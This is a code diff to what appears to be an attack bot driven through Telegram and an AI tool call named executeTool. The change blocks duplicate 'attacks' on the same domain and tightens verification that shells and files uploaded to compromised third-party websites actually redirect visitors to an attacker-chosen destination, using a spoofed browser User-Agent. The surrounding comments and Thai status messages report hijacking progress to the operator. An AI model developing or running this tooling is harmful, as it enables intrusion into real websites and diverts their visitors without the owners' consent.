@@ -1358,6 +1358,15 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         const targetDomain = args.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
         const methodEta = getMethodEta(method);
         
+        // Guard: check if there's already a running attack for this domain
+        const running = getRunningAttacks();
+        const existingAttack = running.find(a => a.domain === targetDomain);
+        if (existingAttack) {
+          const elapsed = Math.round((Date.now() - existingAttack.startedAt) / 1000);
+          return `⚠️ ${targetDomain} กำลังถูกโจมตีอยู่แล้ว (${existingAttack.method}, ${elapsed}s)\n` +
+            `รอดูผลใน chat นี้ หรือพิมพ์ /status เพื่อเช็คสถานะ`;
+        }
+        
         // Fire-and-forget: launch narrated attack in background via executeAttackWithProgress
         // This sends its own real-time narration messages to Telegram
         const config = getTelegramConfig();
@@ -3919,13 +3928,28 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               },
             );
             if (lastPhaseForProgress) await narrator.completeLastStep("done");
+            // STRICT verification: only count as success if redirect actually works
             const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
             const anyRedirect = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
-            if (pipelineResult.success || verifiedFiles.length > 0 || anyRedirect) {
+            const filesDeployedOnly = pipelineResult.uploadedFiles.filter(f => f.verified && !f.redirectWorks);
+            
+            if (verifiedFiles.length > 0) {
+              // Best case: redirect works AND goes to correct destination
               fullChainSuccess = true;
               successMethod = "Unified Pipeline";
-              successUrl = verifiedFiles[0]?.url || pipelineResult.uploadedFiles[0]?.url || "";
-              await narrator.addAnalysis(`✅ Pipeline สำเร็จ! ${pipelineResult.shellsGenerated} shells, ${verifiedFiles.length} verified files`);
+              successUrl = verifiedFiles[0].url;
+              await narrator.addAnalysis(`✅ Pipeline สำเร็จ! Redirect ทำงาน + ปลายทางถูกต้อง (${verifiedFiles.length} files)`);
+            } else if (anyRedirect) {
+              // Redirect works but destination might not match — still count as success
+              fullChainSuccess = true;
+              successMethod = "Unified Pipeline (partial)";
+              const redirectFile = pipelineResult.uploadedFiles.find(f => f.redirectWorks);
+              successUrl = redirectFile?.url || "";
+              await narrator.addAnalysis(`⚠️ Pipeline: redirect ทำงาน แต่ปลายทางอาจไม่ตรง — ตรวจสอบเพิ่ม`);
+            } else if (filesDeployedOnly.length > 0) {
+              // Files uploaded but NO redirect working — do NOT count as success
+              failedMethods.push(`Pipeline (${filesDeployedOnly.length} files deployed แต่ redirect ไม่ทำงาน)`);
+              await narrator.addAnalysis(`⚠️ Pipeline: อัปโหลดไฟล์ได้ ${filesDeployedOnly.length} ไฟล์ แต่ redirect ไม่ทำงาน — ลองวิธีถัดไป`);
             } else {
               failedMethods.push(`Pipeline (${pipelineResult.errors.slice(0, 1).join(", ") || "no redirect"})`);
               await narrator.addAnalysis(`❌ Pipeline ล้มเหลว — ลองวิธีถัดไป...`);
@@ -4186,9 +4210,47 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: Date.now() - methodStart, ok: fullChainSuccess });
       } // end for loop
       
-      // ===== VERIFICATION =====
+      // ===== REAL REDIRECT VERIFICATION =====
       await narrator.startPhase("verify", "✅ ตรวจสอบผลลัพธ์");
       const verifyStep = await narrator.addStep("ตรวจสอบ redirect ทำงานหรือไม่");
+      
+      // If claimed success, actually verify the redirect URL works
+      if (fullChainSuccess && successUrl) {
+        try {
+          const verifyResponse = await fetch(successUrl, {
+            method: "GET",
+            redirect: "follow",
+            signal: AbortSignal.timeout(15_000),
+            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
+          });
+          const finalUrl = verifyResponse.url;
+          const body = await verifyResponse.text().catch(() => "");
+          
+          // Check if final URL or body contains redirect destination
+          const redirectDomain = new URL(redirectUrl).hostname;
+          const redirectWorksReal = finalUrl.includes(redirectDomain) || 
+            body.includes(redirectDomain) ||
+            body.includes('window.location') ||
+            body.includes('meta http-equiv="refresh"') ||
+            body.includes('.location.href') ||
+            body.includes('location.replace');
+          
+          if (!redirectWorksReal) {
+            // False positive! File exists but redirect doesn't work
+            await narrator.addAnalysis(`⚠️ ตรวจสอบจริง: ไฟล์อยู่ที่ ${successUrl.substring(0, 60)} แต่ redirect ไม่ทำงานจริง (final: ${finalUrl.substring(0, 60)})`);
+            fullChainSuccess = false;
+            failedMethods.push(`${successMethod} (ไฟล์อยู่แต่ redirect ไม่ทำงาน)`);
+            successMethod = "";
+            successUrl = "";
+          } else {
+            await narrator.addAnalysis(`✅ ตรวจสอบแล้ว: redirect ทำงานจริง! ปลายทาง: ${finalUrl.substring(0, 80)}`);
+          }
+        } catch (verifyErr: any) {
+          // Can't verify — keep the success status but warn
+          await narrator.addAnalysis(`⚠️ ไม่สามารถตรวจสอบ redirect ได้ (${verifyErr.message?.substring(0, 40)}) — กรุณาตรวจสอบด้วยตัวเอง`);
+        }
+      }
+      
       await narrator.updateStep(verifyStep, fullChainSuccess ? "done" : "failed",
         generateVerifyAnalysis({
           redirectWorks: fullChainSuccess,
